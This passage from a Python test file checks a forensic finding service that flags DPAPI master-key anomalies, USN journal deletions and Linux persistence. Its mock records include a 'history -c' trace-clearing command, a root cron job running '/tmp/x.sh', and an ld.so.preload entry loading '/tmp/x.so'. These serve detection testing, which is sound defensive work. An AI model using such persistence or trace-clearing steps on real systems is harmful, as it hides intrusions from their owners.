    assert db.add.call_args[0][0].source == "windows_appcompat_suspicious_path"


@pytest.mark.asyncio
async def test_emit_dpapi_findings_from_walk_with_mock_rows():
    record = SimpleNamespace(
        master_key_guid="g",
        creator_sid="S-1-5-18",
        file_size_bytes=4096,
        hmac_iterations=1,
        salt_size=16,
        last_modified_ts=None,
        source_file_path="/mk",
        anomaly_flags={"large_masterkey": True},
    )
    db = _mock_db_with_rows([record])
    with patch(
        "app.services.jsonb_normalizers._normalize_windows_dpapi_anomaly_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ):
        emitted = await FindingService(db).emit_dpapi_findings_from_walk(
            uuid.uuid4(), uuid.uuid4()
        )
    assert len(emitted) == 1
    assert db.add.call_args[0][0].source == "windows_dpapi_large_masterkey"


@pytest.mark.asyncio
async def test_emit_usnjrnl_findings_from_walk_deletion():
    ts = datetime(2024, 1, 1, tzinfo=UTC)
    record = SimpleNamespace(
        usn=1,
        file_name="x.exe",
        parent_file_reference_number=99,
        timestamp=ts,
        reason_flags={"file_delete": True},
        source_file_path=r"\\.\C:",
    )
    db = _mock_db_with_rows([record])
    with patch(
        "app.services.jsonb_normalizers._normalize_windows_usnjrnl_reason_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ):
        emitted = await FindingService(db).emit_usnjrnl_findings_from_walk(
            uuid.uuid4(), uuid.uuid4()
        )
    assert len(emitted) == 1
    assert db.add.call_args[0][0].source == "windows_usnjrnl_file_deletion"


@pytest.mark.asyncio
async def test_emit_linux_persistence_findings_from_walk():
    """Three sequential queries: bash history, cron, ld_preload."""
    db = AsyncMock()
    db.add = MagicMock()
    db.flush = AsyncMock()

    bash = SimpleNamespace(
        source_file="/home/u/.bash_history",
        line_number=1,
        command="history -c",
        suspicious_flags={"clear_marker": True},
    )
    cron = SimpleNamespace(
        source_file="/etc/crontab",
        line_number=2,
        schedule_spec="* * * * *",
        user="root",
        command="/tmp/x.sh",
        suspicious_flags={"temp_path_command": True},
    )
    ld = SimpleNamespace(
        source_file="/etc/ld.so.preload",
        line_number=1,
        library_path="/tmp/x.so",
        suspicious_flags={"temp_path_library": True},
    )

    def _rows(items):
        r = MagicMock()
        r.scalars.return_value.all.return_value = items
        return r

    db.execute = AsyncMock(
        side_effect=[_rows([bash]), _rows([cron]), _rows([ld])]
    )
    with patch(
        "app.services.jsonb_normalizers._normalize_linux_bash_history_suspicious_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ), patch(
        "app.services.jsonb_normalizers._normalize_linux_cron_suspicious_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ), patch(
        "app.services.jsonb_normalizers._normalize_linux_ld_preload_suspicious_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ):
        emitted = await FindingService(db).emit_linux_persistence_findings_from_walk(
            uuid.uuid4(), uuid.uuid4()
        )
    assert len(emitted) == 3
    sources = {c[0][0].source for c in db.add.call_args_list}
    assert "linux_bash_history_clear" in sources
    assert "linux_cron_suspicious_command" in sources
    assert "linux_ld_preload_hijack" in sources
